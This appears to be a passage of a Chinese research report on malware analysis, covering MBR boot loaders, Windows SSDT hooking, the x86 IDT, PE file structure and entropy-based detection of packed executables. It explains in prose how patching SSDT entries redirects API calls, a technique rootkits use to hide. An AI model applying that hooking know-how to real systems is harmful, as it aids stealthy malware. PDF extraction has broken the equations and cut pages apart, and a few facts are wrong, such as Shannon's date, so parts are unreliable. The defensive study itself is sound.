圖表 4-12 開機管理程式安裝在 MBR、開機磁區與作業系統的關係(引自於
http://linux.vbird.org/linux_basic/0510osloader.php 圖 1.2.1) 
 
每個作業系統預設會安裝一個開機管理程式在自己的檔案系統中（如上圖中
各 filesystem 左下角的方框），而在 Linux 系統安裝時，可選擇是否要將開機管
理程式安裝到 MBR 上；若安裝到 MBR，在 MBR 與開機磁區都會有一份開機管
理程式的程式碼，而相對於 Windows 安裝時，預設會主動將 MBR 與開機磁區
都安裝開機管理程式，所以可以安裝多重作業系統而 MBR 常常會被不同的作業
系統的開機管理程式所覆蓋。 
雖然各作業系統都可以安裝一份開機管理程式到自己的開機磁區中，那麼作
業系統就可以利用自己的開機磁區來載入核心，但系統的 MBR 只有一個，要怎
麼執行開機磁區裡面的 loader 便是接下來要討論的問題，開機管理程式主要的
功能如下： 
 提供選單： 
使用者可選擇不同的開機項目，也就是多重開機；因此我們可以選擇不同的
核心來開機。 
 載入核心檔案： 
 59 
 
在 BIOS 讀完資訊後，接下來就會到第一個開機磁區的 MBR 去讀取開機管
理程式，該開機管理程式可以具有選單功能、直接載入核心檔案以及控制權移
交的功能等，系統必頇要有 loader 才能載入該作業系統的核心，但 MBR 是整個
硬碟的第一個磁區內的一個區塊，大小為 446 bytes；其中 Linux 將開機管理程
式的程式碼的執行與設定值載入分成兩個階段來執行： 
 階段 1：執行開機管理程式的主程式 
這個主程式必頇被安裝在開機區，亦即 MBR 或開機磁區；但因為 MBR 大
小實在太小，故 MBR 或開機磁區通常只安裝開機管理程式的最小主程式，
並沒有安裝 loader 的相關設定檔。 
 階段 2：主程式載入設定檔 
透過開機管理程式載入所有設定檔及相關的環境參數檔案（包括檔案系統定
義與主要設定檔），一般來說，設定檔都會在/boot 下。 
  
 61 
 
4.1.4 SSDT Hooking 
SSDT 全名為 System Service Descriptor Table，被用來查詢將被使用的
windows API，內容包含各個 function 的 entry、function entry 的數目、傳入 function
的參數總共大小。本章節內介紹的順序，根據實際上使用 SSDT 的流程，從
windows 使用 API 結合 Protection Ring 的方式增進系統安全，大概介紹何謂
Native API，再詳細列出 SSDT 的結構，最後再說 hook Windows API 的概念，及
Windows 所採用的一些保護 SSDT 的方式，造成 hook Windows API 會遇到的困
難、可能用來突破保護的方法，例如：撰寫 kernel-mode Driver。 
 這份報告主要內容來自於 Undocumented Windows 2000 Secrets : A 
Programmers Cook Book 的 Chapter 2、3、4、5，作者為 SVEN B. SCHREIBER，
出版於 2001 年。 
(a) Application Programming Interface with Protection Ring 
API 作為一般程式來存取各別服務的窗口，個別服務可能由應用程式、程式
庫、作業系統所實作提供。使用 API 可以隱藏實作的細節，讓程式設計者能專
心思考程式的邏輯。另方面結合 Protection Ring 的概念也可以做到保護資料、維
持系統穩定的效果。 
一般的作業系統對於 resource 有不同的存取權限。Protection Ring 提供了一個區
分的層級。從最內圈到最外圈，對應最該被保護到最不信任。Ring0 是最受到
存取限制的層級，在 Ring0 內的活動通常是直接和硬體接觸，例如：CPU、
 63 
 
用的 API。但在 windows 2000 中改變了作法，在 win32 subsystem 之下，有更基
本、更基礎的 interface ，叫做 Native API，一般的 programmer 是看不見的，當
programmer 需要撰寫 driver level 的程式時才會大量用到 Native API。 
圖表4-15 簡化後的Windows NT Architecture 
簡圖(引用自:http://technet.microsoft.com/en-us/library/cc768129.aspx) 
 
圖表 4-16表示了 Win32 subsystem 與Native API之間的相依關係，user32.dll、 
advapi32.dll、gdi32.dll、 rpcrt4.dll、kernel32.dll 為部份的 Win32 subsystem。而
ntdll.dll 則為 Native API 在 user-mode 的入口，真正的 interface 則實作在
ntoskrnl.exe。 
 65 
 
handler。Interrupt handler 根據Dispatch ID，在一張存有Dispatch ID與對應 system 
call function 位址的表，在表中找到對應的 system call service 並且跳到該 system 
call service 執行。而詳細 Interrupt handler 所作工作的細節，則在下面段落會提
及。 
(d) System Service Descriptor Table 
在說明 interrupt handler的流程之前，先了解Service Descriptor Table的結構，
錯誤! 找不到參照來源。再以 C language 的結構表示： 
 67 
 
的 function；第二個 module : win32k.sys 則保留給 Win32 subsystem；其餘兩個預
設沒有被使用。 
對於各個 module 所對應的 System Service Table，以下對一些在這份文件中
有提過的屬性作簡略的說明： 
 PNTPROC 是 type 為 NTPROC 的 function pointer，方便用來暫存 Native API
的 function pointer。 
 ServiceTable 包含所有 Native API 的 function pointer。 
 ServiceLimit 代表在 ServiceTable 內找到的 Native API entry 數量。 
 ArgumentTable 記錄每個 ServiceTable entry 對應的 Natve API 被使用時，傳入
的參數總共大小 bytes。 
 ntoskrnl.exe export global Service Descriptor Table: 
 ”KeServiceDescriptorTable”。 
 System Service Table 在 Windows 2000 Driver Development Kit 被標記為
“KiServiceTable”。 
(e) The INT 2Eh System Service Handler work flow 
INT 2Eh gate 在 kernel mode 對應的 handler 為 System Service Dispatcher，在
ntoskrnl.exe 內的 System Service Dispatcher 別名為 KiSystemService( ) ，
KiSystemService( ) 執行下列六個步驟： 
1. 從目前的 Thread Control Block 得到 Service Descript Table 的 pointer。 
2. 根據 Dispatch ID 在 EAX 內的第 12、13 個 bit 以確認是四種 system service 當
 69 
 
圖表 4-20Zw prefix function 內容(圖表引用自 Undocumented Windows 2000 Secrets Chap2 Example 2-1 p.97) 
 
在 ntdll.dll 提供了許多 Windows API 給程式設計者使用，除了 Nt/Zw 構成的
Native API 外，另外尚有一些 Run time Library 包含： 
 The C Run Time Library，例如：memcpy()、sprint()、qsort()等 
 Extended Run Time Library  
 Floating Point Emulator 
 Etc 
(g) Implant hooks into Native API functions 
Hook 被用來擴增、修改軟體(作業系統、應用程式等)的功能。利用 hook 來
攔截程式間的 function calls、message、events 等訊息。攔截這些訊息可以用在
debugging、側錄鍵盤或滑鼠、監視一般程式在作業系統中的行為。Hook 也被惡
意程式用來隱藏惡意程式本身，並偽造可能會洩漏本身資訊的 API calls 的
output。 
Patching the Service Descriptor Table 
Hook Native API function 最簡單直接的方式，就是修改 Service Descriptor 
Table 把某個你想 hook 的 Windows API Function 在 Service Descriptor Table 內的
entry 改成另外寫好的程式碼起始位址，在另外寫的程式碼結束之前呼叫原本的
Windows API Function，把結果回傳給 caller，如此使用者也不會察覺異狀，hook
 71 
 
一種，Paging 將記憶體切成許多大小相等、容量很小的區域，在 virtual memory
的機制裡，每個 page 可能在記憶體的任意地方，被標示為”Protected”。 
Page table 是用來轉換 virtual memory 成 physical memory，page table 使
allocate memory 變成一件容易的事情，因為 page 可能來自 memory 的任何一塊
區域，Page table 通常無法被一般程式所看見。 
圖表 4-22Paging 是記憶體保護的方式之一(圖表引用自: http://en.wikipedia.org/wiki/Virtual_memory) 
 
這樣的設計讓一般程式不可能存取非法的 page，對於一般程式而言，任何沒有
被 allocate 給自己的 page，程式是拿不到實體的記憶體位置的。因為 Windows
對於 SSDT 及許多重要的資源都設有不同的機制來保護，以避免違法的存取，
為了得到 SSDT 的內容，必頇有一個聰明的方法來繞過重重的保護。在實作架
構與方法中將會介紹我們是如何撰寫 kernel-mode Driver，透過這個 kernel-mode 
Driver，我們可以在 user-mode下遠端遙控 kernel-mode Driver以取得較高的權限，
直接拿到 SSDT 的內容，方便之後作為比對之用。  
 73 
 
IDT 只有當處理器處於 protected mode 下時才會開始起作用，是一個 8-byte 
descriptors 的陣列，連續地儲存在記憶體中，且以 interrupt vector 做為索引，而
descriptor 可以是 interrupt gates、trap gates、 task gates，又 IDT 含有指向 ISR 
routines 的 pointers，這三種 descriptor 可引起相對的 ISRs；細節上來說即 Interrupt 
Gates 類似於原來的 interrupt 機制，放置 EFLAGS、CS、EIP 在 stack 中，ISR 會
被放置於 privilege 比目前執行的 process 還高的位置(數字越小代表 privilege 
level 越高)；Trap Gates 同於 interrupt gates，但不清除 interrupt flag；也就是說，
interrupt gate 或 trap gate 涉及目前執行 task 中內容的 exception-handler procedure
或 interrupt-handler procedure，如圖： 
 75 
 
圖表 4-24stack usage without privilege-level change (圖表引用自: Intel® 64 and IA-32 Architectures Software 
Developer’s Manual Volume 3A: System Programming Guide, Part 1 ,Figure 6-4) 
 
 
圖表 4-25stack usage with privilege-level change (圖表引用自: Intel® 64 and IA-32 Architectures Software Developer’s 
Manual Volume 3A: System Programming Guide, Part 1 ,Figure 6-4) 
 
由 ISR 返回時，必頇使用 IRET 指令，如果在 interrupt 時有 switch stack，IRET 
也會把 stack switch 回來。Trap gate 和 interrupt gate 不同的地方是在處理
EFLAGE 的方式，當 interrupt 或 exception 是經由 interrupt gate 時，處理器會把 
IF 設為 0，以避免在 ISR 中再度發生 interrupt，在返回時，處理器會恢復 IF 的
值；但是，如果 interrupt 是經由 trap gate，則處理器不會改變 IF 的值，也就是
說，在 ISR 中有可能會再度發生 interrupt。interrupt gate 會使處理器對於再發生
的 hardware interrupts 失去處理能力，因此適於服務 hardware interrupts，而 trap 
gate 會使 hardware interrupts 維持在 enabled 的狀態，因此主要用於處理 software 
interrupts and exceptions。Task Gates 會造成 task switch，允許 ISR 執行自己的
 77 
 
(b) Gate descriptor 的格式與行為 
對於格式上來講，在 IDT 中的 gate descriptor 和在 GDT 中所使用格式相
同；其中，interrupt gate 和 trap gate 的 descriptor 和 call gate descriptor 的格
式很像；而 task gate descriptor 則是指向 ISR 的 TSS segment。它們的格式如下
圖： 
圖表4-26 gate descriptor的格式 (圖表引用自: Intel® 64 and IA-32 Architectures Software Developer’s Manual 
Volume 3A: System Programming Guide, Part 1 ,Figure 6-2) 
 
 
在 interrupt發生時，如果 IDT中對應的 descriptor是 interrupt gate或 trap gate，
則處理器的行為類似用 CALL 在呼叫一個 call gate，且含有 far pointer(segment 
 79 
 
table(SSDT)，OS 用它來處理 system call，IDT 用來處理硬體和軟體的 interrupt。 
(d) IDTR 
protected mode IDT 位於 physical memory 的任何一個地方，處理器會有特別
的暫存器(IDT  register，亦稱 IDTR )來儲存 physical base address 和 the length in 
bytes of the IDT，它的長度為 48 bits，較低位元的 16 bits 稱為 IDTR 的 LIMIT 
section，而較高位元的 32 bits 為 IDTR 的 BASE section，如下圖所示： 
圖表 4-28IDTR structure 
 
BASE 代表 IDT 在 memory 的 base address，IDT 可以置於 memory 中的任何
一個地方，但 BASE 必頇指向它，LIMIT field 則存放 IDT 目前的長度。 
LIDT (load IDT register)和 SIDT(store IDT register)指令分別是用來 load 和
store IDTR的內容，LIDT指令 load存在記憶體內的base address和 limit到 IDTR。
這個指令只有當 CPL 是 0 是才會被執行，通常是作業系統建 IDT 時的
initialization code 會使用 LIDT，作業系統也可能利用 LIDT 來改變 IDT；而 SIDT
指令是複製儲存在 IDTR 的 base 和 limit 值到記憶體中，這個指令可以在任何的
privilege level 下被執行，如果一個 vector 指向的 descriptor 超過 IDT 的 limit，則
general-protection exception(#GP)就會發生。IDT 和 IDTR 的關係圖如下： 
圖表4-29 IDT與IDTR的對應關係 (圖表引用自: [6] Intel® 64 and IA-32 Architectures Software Developer’s Manual 
 81 
 
圖表 4-30 IDTR 中 limit 和 base 與 IDT 的對應及 IDT vector 的內容解析(圖表引用自: 
http://loda.hala01.com/2009/04/linux 圖(五),x86 IDT 架構) 
 
 
其中，Segment Selector(16bits)定義 ISR 所在的 segment selector，根據 selector
的值對應到 GDT 的欄位；而 Offset(32bits)為 ISR 在指定 segment 內進入點的相
對位址，通常都會根據 GDT 欄位中的 Base address 加 IDT 欄位中的 Offset 來找
出 ISR 的進入點；DPL(2bits)(Descriptor Privilege Level)定義 interrupt privilege 
level，可是 0~3(Ring0~Ring3)，例如，由 kernel (Ring 0 )提供給 Ring3(user)程式
碼使用的 system call，就是透過 DPL 為 3 的 80h interrupt 來完成，其它的 interrupt 
DPL 為 0，user code 無法直接使用。[7] 
在 x86 protected mode 下，前 32 個 interrupt 都被 Intel 定義為系統 exception
與預留的 interrupt service，因此現在 protected mode 作業系統都會把 interrupt 
service 定義在 20h 以後的 interrupt number(包括 IRQ 所對應的 interrupt)。 
 83 
 
12 Stack fault (pushes an error code) 
13 General protection fault (pushes an error code) 
14 Page fault (pushes an error code) 
15 Unknown interrupt exception  
16 Coprocessor fault  
17 Alignment check exception  
18 Machine check exception  
19~31 Reserved  
 
(f) ISR 的保護 
ISR 的保護和 general procedure 一樣，處理器不允許進入 privilege level 較低
的 ISR 中，也就是說，當 interrupt 發生時，如果進入 privilege level 比 current 
privilege level (CPL) 更低的 ISR 時，則處理器會發出 general-protection（#GP）
exception；而和 general procedure 不同的是 interrupt vector 沒有 requested privilege 
level (RPL)，所以處理器不會檢查 RPL，且只有在 interrupt 或 exception 是由 INT 
n、INT3、INTO 指令產生的時候，才會檢查 gate 的 current privilege level (CPL)
是否比 descriptor privilege level (DPL)小，這可以避免 level 較低的 procedure 利
用這些指令破壞系統的 ISR（如 page-fault）；對硬體產生的 interrupt 或 exception，
處理器不會檢查 gate 的 descriptor privilege level (DPL)，因為 interrupt 隨時都可
能發生，因此這些限制可能會導致不適當的錯誤，但有兩個方法可用來避免這
個問題： 
(1)若 ISR 只需要處理 stack 中的資料（例如，divided by zero），則可以把這
個 procedure 放到 conforming 的 code segment 中。 
 85 
 
4.1.6 可執行檔檔格式解析 
電腦檔案是由二進位的數值所組成的，為了區分不同類型的文件檔案，其電
腦的檔案系統制定了各種不同的標頭檔 (header)來做識別；可執行檔，又稱
PE(portable executable) 檔是微軟視窗系統中用來運行程式碼的檔案格式，又可
以分為被至記憶體中執行的 EXE 以及動態連接文件的 DLL。這種 PE 檔案的檔
頭可以標明 windows 要如何配置記憶體空間讓程式正常運作，這些資訊是由編
譯器(compiler)與連接器(linker)所完成的。例如：WindowsNT 預設的程式為只是
0x40000；當然，這個數值可以利用 VC 在編譯該程式的時候更改此地址值。在
不同的作業系統中，就會有不同的可執行檔案格式。如 Linux 使用的 ELF 格式；
同樣地，此檔頭格式也是由 Linux 上的編譯器所建立的。針對不同的 CPU 指令
架構與作業系統，就會有不同的數值與格式。以下我們將會介紹 Win32 的可執
行檔格式，並簡單的剖析其檔頭內容。 
  
 87 
 
用者，以區分出舊的 DOS 可執行檔與新版的 portable-executable file 的分別。 
PE header： 
當作業系統執行 PE 檔案時，PE loader 將會從 DOS MZ header 中找到 PE 
header 的偏移量以跳過 DOS stub 直接定址到真正的 PE header。PE header 整個
事 IMAGE_NT_HEADERS 的結構，定義於 WINNT.H。當載入器跳到 PE header
之後，會根據裡面的每個區域檢查這是不是一個有效的 PE 檔案格式，是否能在
當下的 CPU 運行，優先的基址(base address)是多少，一共有幾個 section，這是
一個 EXE 檔還是 DLL 檔等資訊。主要可分為一個 DWORD 特徵值與兩個子結
構 IMAGE_FILE_HEADER 和 IMAGE_OPTIONAL_HEADER： 
DWORD Signature：欄位內容應為 ASCII 的 PE\0\0 
  
 89 
 
(200h)，，那麼每節的起始地址必頇是 512 的倍數。若
第一節從檔偏移量 200h 開始且大小是 10 個位元組，則
下一節必定位於偏移量 400h: 即使偏移量 512 和 1024
之間還有很多空間沒被使用/定義。 
MajorSubsystemVersion 
MinorSubsystemVersion  
win32 子系統版本。若 PE 檔是專門為 Win32 設計的，
該子系統版本必定是 4.0 否則對話方塊不會有 3 維立體
感。 
SizeOfImage 記憶體中整個 PE 檔案大小。它是所經過節對齊處理後
的大小。 
SizeOfHeaders 所有檔頭的大小，也就等於 SizeOfImage 減去檔案中所
有 section 的尺寸。可以以此值作為 PE 檔第一節的檔偏
移量。 
Subsystem NT 用來識別 PE 檔屬於哪個子系統。對於大多數 Win32
程式，只有兩類值: Windows GUI 和 Windows CUI (控制
台)。 
SizeOfStackReserve 執行緒初始堆疊的保留大小。 
SizeOfStackCommit 一開始即被提交（committed）給執行緒初始堆疊的記
憶體數量。 
SizeOfHeapReserve 保留給最初的 process heap 的虛擬記憶體數量。 
SizeOfHeapCommit 一開始即被提交（committed）給 process heap 的記憶
體數量。  
DataDirectory IMAGE_DATA_DIRECTORY 結構陣列。每個結構給出一個
重要資料結構的 RVA，比如載入位址表等。 
有了這些總體資訊之後載入器就會跳到下面的 section table。 
Section Table： 
有了上面的資訊後，載入器並不能準確的檔案。由於 PE 檔案可以規定每個
section 不同的屬性，例如：該 section 是否可讀寫，要到記憶體位址的哪一部分，
這一部分是程式碼還是資料等。這些資訊將保留在 section table裡面。section table
是一個指標陣列，陣列裡的每一個指標將對應到其中的一個 section。PE 載入器
會經由每一個 section，正確地把 section 的內容放置在記憶體中。 
 91 
 
虛擬位址即程式中使用的位址，也就是從程式撰寫者的角度所看到的位址，
有時候也可稱之邏輯位址(logic address)。在以往的程式中，真實模式(real mode)
使用了 segment的方式來定位：經由一個 segment的值再搭配一個偏移量來達成。
在 32 位元的系統中使用的是帄坦(flat)的記憶體模式，所以我們可以不用計算出
segment 的偏移量，只要考慮 32 位元的偏移量即可(從 0 開始)。此 32 位元的偏
移量可用數學表示232個記憶體位址(也就是 4G)。這部分的空間是程式與作業系
統共用，在 windows 系統中，程式開發者大約有 2G 的記憶體可以使用。這些記
憶體空間將會被作業系統的分業表(page table)分開管理，用來獨立於其他程式以
達成保護的作用。 
相對虛擬位址 relative virtual address (RVA)： 
即相對於基底為址(base address)的相對偏移量。基底為只是一 PE 檔被的起
始位置。PE 檔中的許多欄位都會用 RVA 來表示，一個 RVA 是某一資料向的偏
移值。例如，windows 把一個 PE 檔仔入到虛擬記憶體位址 0x400000 處，如果
此 image 有一個表格開始於 0x401464，那這個表格的 RVA 就是 0x1464：
虛擬位址−基底為址 = RVA。在 PE 檔中，大多數的位址多是 RVA，而 RVA 只
有當 PE 檔備 PE loader 記憶體後才會有意義。如果我們直接將 image 直接映射
到記憶體而不是透過 PE loader，則這些 RVA 將不能被正確地使用，需要利用
RVAToOffset 函式才可以轉換成偏移量。 
 93 
 
的 PE 檔。 
現在我們已知道 IMAGE_SECTION_HEADER 結構，再來介紹 PE loader
的工作: 
1. 讀取  IMAGE_FILE_HEADER 的  NumberOfSections 域，知道
section 數。 
2. SizeOfHeaders 域值作為 section table 的檔偏移量，並以此定位
section table。 
3. 遍歷整個結構陣列檢查各成員值。 
4. 對於每個結構，我們讀取 PointerToRawData 域值並定位到該檔偏移
量。然後再讀取 SizeOfRawData 域值來決定映射記憶體的位元組數。
經由下面計算： 
VirtualAddress + ImageBase = section起始的虛擬位址 
然後就準備把節映射進記憶體，並根據 Characteristics 域值設置屬
性。 
5. 遍歷整個陣列，直至所有 section 都已處理完畢。 
遍歷 section table 的步驟: 
1. PE 文件有效性校驗。 
2. 定位到 PE header 的起始位址。 
3. 從 file header 的 NumberOfSections 域獲取節數。 
4. 通過兩種方法定位節表: ImageBase+SizeOfHeaders 或者 PE header
 95 
 
導入表 Import table 
在說明 Import Table 和 Export Table 的作用之前，將介紹編譯器是如何處理
外部庫函式。在 PE 檔中，當你調用另一模組中的函式（例如 USER32.DLL 中
的 GetMessage），編譯器製造出來的 CALL 指令並不會把控制權直接傳給 DLL 
中的函式，而是傳給一個 JMP DWORD PTR [XXXXXXXX] 指令，後者也位
於.text 中。JMP 指令跳到一個位址去，此位址儲存在.idata 的一個 DWORD 之
中。這個 DWORD 內含該函式的真正位址（函式進入點），如圖所示： 
圖表 4-33 載入函式呼叫流程 
 
為什麼不直接使用 CALL 指令跳到 DLL 中的函式位址呢？原因在於 DLL
每次的位址不一定相同，如果 import/export 的函式位址改變，則 PE loader 就要
 
CALL 00014408 
(call to 
GetMessage) 
JMP DWORD PTR 
[00040042] 
000144
08 
BFC0847D 000400
42 … 
BFC0847D GetMessage: 
… 
USER32.DLL .idata (import table) 
.text 
 97 
 
14  COM descriptor 
Data Directory 包含了 PE 檔中各重要資料結構的位置和尺寸資訊。Data 
Directory 的每個成員都是 IMAGE_DATA_DIRECTORY 結構類型的，其定義如
下所示:  
 
VirtualAddress 實際上是資料結構的相對虛擬位址(RVA)。比如，如果該結
構是關於 import symbols 的，該域就包含指向 IMAGE_IMPORT_DESCRIPTOR 
陣列的 RVA。而 isize 含有 VirtualAddress 所指向資料結構的位元組數。 
現在我們知道如何找到載入函式表了。Data Directory 陣列第二項的
VirtualAddress 包 含 載 入 函 式 表 位 址 。 載 入 函 式 表 實 際 上 是 一 個 
IMAGE_IMPORT_DESCRIPTOR 結構陣列。每個結構包含 PE 檔載入函式的一
個相關 DLL 的資訊。比如，如果該 PE 檔從 10 個不同的 DLL 中載入函式，那
麼這個陣列就有 10 個成員。該陣列以一個全 0 的成員結尾。下面詳細研究結構
組成： 
IMAGE_DATA_DIRECTORY STRUCT  
  VirtualAddress dd ? 
isize dd ?  
IMAGE_DATA_DIRECTORY ENDS 
 99 
 
IMAGE_THUNK_DATA union ， 而 當 函 式 以 名 稱 輸 入 的 時 候
IMAGE_THUNK_DATA 又指向一個 IMAGE_IMPORT_BY_NAME 結構，所以
此時一個輸入函式對應一個 IMAGE_IMPORT_BY_NAME 結構。現在讓我們看
看 IMAGE_IMPORT_BY_NAME 結構裡面有些什麼，我們希望裡面存有一個載
入函式的相關資訊： 
 
Hint：指示本函式在其所駐留 DLL 的引出表中的索引號。該域被 PE loader
用來在 DLL 的引出表裡快速查詢函式。 Name1 含有載入函式的函式名。函
式名是一個 ASCII 字串。現在請看這裡: 假設程式中調用了 n 個輸入函式，那麼
就對應著有 n 個 IMAGE_IMPORT_BY_NAME 結構，我們收集起這些結構的
RVA 放在 IMAGE_THUNK_DATA 結構中組成一個陣列，並以 0 結尾，然後再
將此陣列的 RVA 放入  OriginalFirstThunk 。這樣一來我們就可以利用
OriginalFirstThunk 這指標把某一個 DLL 中使用的函式全部給揪出來。 
 回 IMAGE_IMPORT_DESCRIPTOR 結 構 ， FirstThunk 與 
OriginalFirstThunk 非 常 相 似 ， 也 是 一 個 RVA ， 它 也 是 指 向 一 個 
IMAGE_THUNK_DATA 結構陣列(當然這是另外一個 IMAGE_THUNK_DATA 
結構陣列，不過這個 IMAGE_THUNK_DATA 結構陣列和 OriginalFirstThunk 指
IMAGE_IMPORT_BY_NAME 
STRUCT  
  Hint dw ? 
  Name1 db ? 
IMAGE_IMPORT_BY_NAME 
ENDS 
 
 101 
 
圖表 4-34 重新寫入載入函式位址 
 
PE loader 將會按照下面步驟找到導入的函式： 
1. 校驗檔是否是有效的 PE 檔案。 
2. 從 DOS header 定位到 PE header。 
3. 獲取位於 OptionalHeader 資料目錄位址。 
4. 轉至資料目錄的第二個成員提取其 VirtualAddress 值。
//import   
5. 利用上值定位第一個  IMAGE_IMPORT_DESCRIPTOR 結
構。 
6. 檢 查  OriginalFirstThunk 值 。 若 不 為 0 ， 順 著 
OriginalFirstThunk 裡 的 RVA 值 轉 入 那 個 RVA 陣 列 。 若 
OriginalFirstThunk 為 0，就改用 FirstThunk 值。有些連接器生成
PE 檔時會置 OriginalFirstThunk 值為 0，這應該算是個 bug。不過為
了安全起見，我們還是檢查 OriginalFirstThunk 值先。 
7. 對 於 每 個 陣 列 元 素 ， 我 們 比 對 元 素 值 是 否 等 於
 103 
 
4.1.7 資訊熵 
在靜態分析大量的惡意樣本程式中，對於自動化分析與識別惡意程式的分
析工作來說，加殼或加密的惡意程式是一個極大的挑戰。利用資訊熵來做統計
上的分群，可以讓分析有效率且快速地去識別出那些加殼與加密的惡意樣本。
由於加殼加密的惡意樣本會使用程式混淆(code obfuscation)技巧，來避免程式分
析者得知其攻擊手法，在近年來，加殼加密的手法層出不窮。對於以往使用特
徵值(pattern-based)的偵測惡意字串與惡意程式碼，駭客們使用了加殼加密手法，
把原本的可執行檔內容轉換成看似隨意亂數的二進位檔。由於無法識別其加殼
過後的可執行檔內容，分析人員要做逆向工程將會有極大的困難。 
這些駭客們利用加殼或加密手法，破壞可執行檔的規律性，利用加密演算
法的擴散性(diffusion)和混淆性(confusion)的技術，來保護其自身攻擊的演算法。
例如：利用 3-DES 加密演算法來產生加密過後的可執行檔。由於 3-DES 所產生
的檔案區塊難以預測其未加密的數值，其原因在於它重複了數次的運算，使得
讓原始內容與加密過後的內容相差甚遠。此一做法，為了就是破壞其原本可執
行檔的規律性，提高檔案的不確定性。在 1984 年 Claude E. Shannon 提出了資訊
熵(Shannon entropy，以後簡稱為 entropy)來量化一個檔案的亂度。由於加殼加密
手法的目的就是為了提高亂度，故我們可以利用資訊熵(entropy)來分出一般可執
行檔與加殼加密過的檔案。 
在資訊理論(information theory)的研究中，二進位熵(Binary entropy function)
 105 
 
 資訊熵(Entropy)是利用統計來計算數位訊息的不確定性，換句話說也可以代
表著亂度。”不確定性(uncertainty)的程度可以量化嗎？”這在 1940 年末由於資
訊理論(information theory)的需要而誕生了 Shannon entropy。它在現代的科學領
域中扮演著重要的角色。本計畫利用量化可執行檔的亂度，來推斷出該執行檔
是否有經過加殼程式保護。在正常的執行檔中，由於指令碼的格式固定 op code，
再解析二進位資料的時候，往往會有一套規律。舉例來說，cmp 指令通常在 je,jne
之前，或者是可能會有集中使用的記憶體區段。也因為這些規律性，使得讓可
執行檔的 entropy 降低，以下為資訊熵做詳細的介紹。 
Shannon Entropy 
 假設我們有兩枚硬幣，一面硬幣做的兩面大小一樣、重量一樣。而另一枚則
是一面頭重腳輕，大小不均。在大多數人的推斷當中，第一面硬幣比較難以猜
測它的結果，因為他的機率看似 1/2。相對的，另外一面的結果可能總會讓輕的
那一面朝上，而導致機率不帄均。經過這些觀察，我們可以歸納一些數學式子。
假設樣本空間 (Sample space) X 有 n 的基本事件，其基本事件 wi 的概率為 pi, 
i=1,2,…,n。由於所有事件的機率總和是 1，故基本關係式∑ pi = 1, pi ≥ 0ni=1  i =
1,2,… , n。我們用𝐻(𝑝1, … , 𝑝𝑛)來表示這個樣本空間的亂度。而這個函式 H 用來
刻劃具有概率分別為 p1,p2, …, pn的事件 w1,w2,…,wn的樣本空間的「不確定度」。
𝐻(𝑝1, … , 𝑝𝑛)若要精確地反映詴驗結果的不確定度，似乎必頇滿足下列三個基本
條件： 
 107 
 
圖表 4-36 公司尾牙抽獎的階層式機率事件 
 
圖表 4-37 公司尾牙抽獎的直接式機率事件 
 
 
 
行政
部門 
研發
部門 
製造
部門 
 
 109 
 
 
這就證明了斷言。 
現在設正整數 t,s,n 和 m 滿足 
𝑚 𝑙𝑜𝑔 𝑠  𝑛 𝑙𝑜𝑔   (𝑚 + 1) 𝑙𝑜𝑔 𝑠 
即 
𝑚
𝑛
 
𝑙𝑜𝑔  
𝑙𝑜𝑔 𝑠
 
𝑚
𝑛
+
1
𝑛
 
故有 
|
𝑚
𝑛
−
𝑙𝑜𝑔  
𝑙𝑜𝑔 𝑠
|  
1
𝑛
 
由條件(ii)，A 是其自變量的單調遞增函數，且由我們剛證的斷言，有 
𝑚𝐴(𝑠)  𝑛𝐴( )  (𝑚 + 1)𝐴(𝑠) 
由上述兩式可知 
1
8
 
1
8
 
1
8
 
1
8
 
1
8
 
1
8
 
1
8
 
1
8
 
1
2
 
1
2
 
1
4
 
1
4
 
1
4
 
1
4
 
1
8
 
1
8
 
1
8
 
1
8
 
1
8
 
1
8
 
1
8
 
1
8
 
 111 
 
 
根據條件(iii) 
𝐻 (
1
6
,… ,
1
6
) = 𝐻 (
1
2
,
1
3
,
1
6
) +
1
2
𝐻 (
1
2
,
1
3
,
1
3
) +
1
3
𝐻 (
1
2
,
1
2
) +
1
6
𝐻(1) 
故有 
𝐻 (
1
2
,
1
3
,
1
6
) = 𝐻 (
1
6
,… ,
1
6
) −
1
2
𝐻 (
1
2
,
1
3
,
1
3
) −
1
3
𝐻 (
1
2
,
1
2
) −
1
6
𝐻(1) 
這樣分解的目的在於我們可用第一步證明的結果來證明第二步。令𝑛1 = 3, 𝑛2 =
2, 𝑛3 = 1，則 
𝑝1 =
1
2
=
𝑛1
𝑛1 + 𝑛2 + 𝑛3
 
𝑝2 =
1
3
=
𝑛2
𝑛1 + 𝑛2 + 𝑛3
 
𝑝2 =
1
6
=
𝑛3
𝑛1 + 𝑛2 + 𝑛3
 
 
將上面結果抽象化，我們就有， 
1
6
 
1
6
 
1
6
 
1
6
 
1
6
 
1
6
 
1
2
 
1
6
 
1
3
 
1
3
 
1
3
 1
2
 
1
2
 
1
3
 
1
6
 
1
6
 
1
6
 
1
6
 
1
6
 
1
6
 
 113 
 
差值。由於加殼加密技術目的在於混淆程式碼，讓二進位檔案看似一串不關聯
的亂數值，此作法雖能夠避免分析但也提高了其資訊熵。此篇論文對於一個輸
入檔案，看成一個 n 個連續的數字，n 為檔案的 byte 數。接著計算其資訊熵： 
𝐻(𝑥) = −∑𝑝(𝑖) 𝑙𝑜𝑔2 𝑝(𝑖)
𝑛
𝑖=1
 
其中 i 代表為第 i 個 byte，而𝑝(𝑖)代表該數值出現的機率，由於一個 byte 的
值為 0~256，而最後𝐻(𝑥)即這個文件的資訊熵。而從上述的理論可知，資訊熵
越高則代表其檔案內容的亂度越高。由於可執行檔常出現的 opcode 的值是固定
的，故如果為一個可執行檔，該資訊熵應該會在較低的範圍內。圖表 4-38 為微
軟視窗作業系統中 notepad.exe 的每個 byte 值的出現頻率的統計圖表。藍色為正
常一般的 notepad.exe，紅色線條表示 UPX 加殼過後的頻率圖表，而綠色則為壓
縮成 notepad.zip 的圖表。從圖可知原本的 notepad.exe 包含很多 00 與 FF 的值，
經過壓縮和加殼過後，每個 byte 值的出現頻率將比較帄均的分散在其他的值域
當中。為了方便檢視，圖表 4-39 將篩選過大的值，比較清楚的可以看出藍線會
集中在幾個特定的值域當中，而壓縮過後，會把太多相同的值省略，而減少了
集中的現象。加殼過後的 notepad.exe 則是介於兩者之間。 
 115 
 
個區間內可以包含 99.99%的測詴資料。而每個文件中一定會存在最高的
𝑝(𝑖) 𝑙𝑜𝑔2 𝑝(𝑖)值，其中再把該值帄均之後，就可得到第三欄。可以發現可執行檔
的最高資訊熵與帄均資訊熵的差異最大，由此可知可執行檔每個 byte 出現的頻
率差可能極大。（由 notepad.exe 可知 00 與 FF 相對於其他值是差異非常大的）。
